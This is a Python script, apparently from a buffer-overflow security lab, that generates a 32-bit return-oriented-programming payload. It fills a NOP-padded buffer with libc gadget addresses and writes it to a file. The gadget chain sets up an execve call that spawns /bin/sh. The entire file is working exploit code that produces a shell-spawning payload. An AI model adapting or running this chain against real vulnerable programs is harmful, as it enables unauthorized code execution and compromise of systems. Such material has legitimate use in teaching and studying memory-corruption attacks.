#!/usr/bin/python3
import argparse
import binascii
import os, sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))    # For importing ROPChain
from rop_chain import ROPChain

class GenerateShellcode:
    def __init__(self, args):
        # Fill the buffer with NOP's (x90)
        self.buffer = bytearray(b'\x90' * 517)
        self.buffer_offset = 23
        self.buffer_word_index = 0

        self.gadgets_path = args.gadgets
        self.libc_offset = int(args.libc_offset, 16)
        self.init_esp_addr = int(args.init_esp_addr, 16)
        self.num_bytes = 4

        if self.gadgets_path is not None:
            self.rop_chain = ROPChain(self.gadgets_path)
            self.rop_chain.parse_gadgets_file()

    def store_word(self, word):
        reversed_bytes = word.to_bytes(self.num_bytes, byteorder='little')

        for i in range(self.num_bytes):  # Iterate over each of the four bytes in the word
            index = self.buffer_offset + self.num_bytes*self.buffer_word_index + i
            self.buffer[index] = reversed_bytes[i]

        self.buffer_word_index += 1

    def store_libc_word(self, word):
        self.store_word(word + self.libc_offset)

    def store_gadget(self, gadget_str):
        assert(hasattr(self, "rop_chain"))
        libc_gadget = self.rop_chain.get_gadget(gadget_str) + self.libc_offset
        self.store_word(libc_gadget)
        print(hex(libc_gadget) + " => " + gadget_str)

    def store_str(self, plain_str):
        reversed_str = plain_str[::-1]  # Reverse the string, because store_word() will re-reverse it
        hex_str = reversed_str.encode("ascii").hex()
        self.store_word(int(hex_str, 16))

    def get_shellcode(self):
        # To create the shellcode below, we used store_gadget() to find appropriate gadgets

        # Add 0x34 (i.e. 13 in decimal) because there's 13 gadgets from the first gadget to /bin/sh
        shell_addr = self.init_esp_addr + 0x34

        self.store_libc_word(0x2c79c)   # xor eax, eax ; ret ;
        self.store_libc_word(0x2bc6c)   # pop ecx ; pop edx ; ret ;
        self.store_word(0x0b0b0b0b)
        self.store_word(shell_addr - 0x4 - 0x18)  # Point to zero word - 0x18

        self.store_libc_word(0x2bca3)   # mov dword ptr [edx + 0x18], eax ; ret ;
                                        # - Update 0xdecafbad to 0
        self.store_libc_word(0x5f8a7)   # add al, ch ; ret ;
                                        # - Set eax to just 0x0b

        self.store_libc_word(0xe81c8)   # pop ebx ; ret ;
        self.store_word(shell_addr)     # Point to "/bin/sh"
        self.store_libc_word(0x2bc6c)   # pop ecx ; pop edx ; ret ;
        self.store_word(shell_addr - 0x8)   # Point to address of the argv array
        self.store_word(shell_addr - 0x4)   # Point to address of the envp array

        self.store_libc_word(0xb1265)       # call dword ptr gs:[0x10] ; ret ;
        self.store_word(shell_addr - 0x4)   # Point to 0xdecafbad
        self.store_word(0xdecafbad)         # Temporary value that will get replaced with 0 by the 0xb7e34ca3 gadget
        self.store_str("/bin")
        self.store_str("/sh\0")

    def get_shellcode_automatically(self):
        assert(hasattr(self, "rop_chain"))

        # Add 0x34 (i.e. 13 in decimal) because there's 13 gadgets from the first gadget to /bin/sh
        shell_addr = self.init_esp_addr + 0x34

        self.store_gadget("xor eax, eax ; ret ;")
        self.store_gadget("pop ecx ; pop edx ; ret ;")
        self.store_word(0x0b0b0b0b)
        self.store_word(shell_addr - 0x4 - 0x18)    # Point to zero word - 0x18

        self.store_gadget("mov dword ptr [edx + 0x18], eax ; ret ;")    # - Update 0xdecafbad to 0
        self.store_gadget("add al, ch ; ret ;")     # - Set eax to just 0x0b

        self.store_gadget("pop ebx ; ret ;")
        self.store_word(shell_addr)         # Point to "/bin/sh"
        self.store_gadget("pop ecx ; pop edx ; ret ;")
        self.store_word(shell_addr - 0x8)   # Point to address of the argv array
        self.store_word(shell_addr - 0x4)   # Point to address of the envp array

        self.store_gadget("call dword ptr gs:[0x10] ; ret ;")
        self.store_word(shell_addr - 0x4)   # Point to 0xdecafbad
        self.store_word(0xdecafbad)         # Temporary value that will get replaced with 0 by the 0xb7e34ca3 gadget
        self.store_str("/bin")
        self.store_str("/sh\0")

if __name__ == "__main__":
    arg_parser = argparse.ArgumentParser(description="Create a ROP chain using the gadgets found")
    arg_parser.add_argument("--gadgets", help="File path of the gadgets returned by ROPgadget", required=False)
    arg_parser.add_argument("--libc_offset", help="Offset of libc", required=True)
    arg_parser.add_argument("--init_esp_addr", help="Address stored at ESP at the first gadget", required=False, default="0xbffffbb0")
    args = arg_parser.parse_args()

    gen_shellcode = GenerateShellcode(args)
    if args.gadgets is None:
        gen_shellcode.get_shellcode()
    else:
        gen_shellcode.get_shellcode_automatically()

    # Write the content to badfile
    file = open("shellcode", "wb")
    file.write(gen_shellcode.buffer)
    file.close()
